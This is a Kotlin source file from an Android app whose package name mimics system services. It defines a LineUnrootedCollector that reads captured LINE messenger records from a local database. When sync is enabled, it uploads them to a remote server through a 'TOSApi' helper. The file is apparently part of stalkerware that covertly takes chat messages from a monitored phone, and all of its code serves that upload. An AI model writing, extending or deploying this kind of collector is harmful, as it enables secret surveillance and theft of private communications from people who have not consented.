package com.android.services.logs.collectors.im.unrooted

import android.content.Context
import com.android.services.interfaces.LogsCollector
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.network.RemoteServerHelper
import com.android.services.network.api.NodeServerThreeApi
import com.android.services.network.api.TOSApi
import com.android.services.util.AppConstants
import com.android.services.util.AppUtils
import com.android.services.util.logException
import com.android.services.util.logVerbose

class LineUnrootedCollector(
    private val context: Context,
    private val localDatabaseSource: LocalDatabaseSource,
    private val tosApi: TOSApi,
) : LogsCollector {

    override fun uploadLogs() {
        if (AppConstants.syncLine) {
            try {
                val LineList = localDatabaseSource.selectLineUnrooteds()
                if (LineList.isNotEmpty()) {
                    val endId = LineList[LineList.size - 1].id
                    val startId = LineList[0].id
                    val mLineSender = RemoteServerHelper(
                        context,
                        AppConstants.LINE_UNROOTED_TYPE,
                        localDatabaseSource,
                        tosApi = tosApi,
                        startId = startId,
                        endId = endId
                    )
                    mLineSender.upload(LineList)
                }
            } catch (e: Exception) {
                logException(
                    "${AppConstants.LINE_UNROOTED_TYPE} ${AppUtils.currentMethod} exp = ${e.message}",
                    throwable = e
                )
            }
        } else {
            logVerbose("${AppConstants.LINE_UNROOTED_TYPE} Sync is Off")
        }
    }
}